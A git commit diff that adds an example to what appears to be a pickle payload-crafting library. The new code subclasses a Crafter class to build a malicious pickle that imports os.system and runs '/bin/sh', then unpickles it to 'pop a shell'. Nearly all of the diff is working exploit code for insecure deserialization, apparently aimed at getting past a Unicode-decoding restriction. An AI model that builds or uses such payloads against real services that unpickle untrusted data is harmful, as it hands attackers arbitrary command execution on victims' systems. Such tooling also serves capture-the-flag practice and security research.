0482933e54802ba40b26c9ef20001a1f0a1071ca
Xornet-Euphoria <einnotwendigesubel@gmail.com>
2024-03-03 01:37:47 +0900

    add example: override methods

--- examples/unipickle.py
+++ examples/unipickle.py
@@ -5,19 +5,38 @@ import pickle
 import pickaxe
 
 
+class UnicodeCrafter(pickaxe.Crafter):
+    # override this method
+    # because pickle.SHORT_BINUNICODE is b'\x8c' and may raises UnicodeDecodeError
+    def push_str(self, s):
+        data = s.encode("utf-8")
+        length = len(data)
+
+        self.add_payload(pickle.SHORT_BINSTRING)
+        self._add_number1(length)
+        self.add_payload(data)
+
+    def stack_global(self):
+        # u"\c293"
+        self.put_memo(0xc2)  # no effect to stack
+        self.add_payload(pickle.STACK_GLOBAL)
+
+
+    def import_from(self, module: str, name: str, *, use_stack=True):
+        self.push(module)
+        self.push(name)
+        self.stack_global()
+
+
 s1 = "os"
 s2 = "system"
 s3 = "/bin/sh"
 
-crafter = pickaxe.Crafter()
-crafter.push_str(s1)
-crafter.push_str(s2)
-
-crafter.put_memo(0xc2)
-crafter.add_payload(pickle.STACK_GLOBAL)
+crafter = UnicodeCrafter()
+crafter.import_from(s1, s2)
 
 crafter.mark()
-crafter.push_str(s3)
+crafter.push(s3)
 crafter.call_f(1, use_mark=True)
 
 payload = crafter.get_payload(check_stop=True)
@@ -29,5 +48,5 @@ try:
     assert len(payload_s.split()) == 1
     # pop a shell
     pickle.loads(payload)
-except:
-    print("????")
+except Exception as ex:
+    print("????", payload, ex)
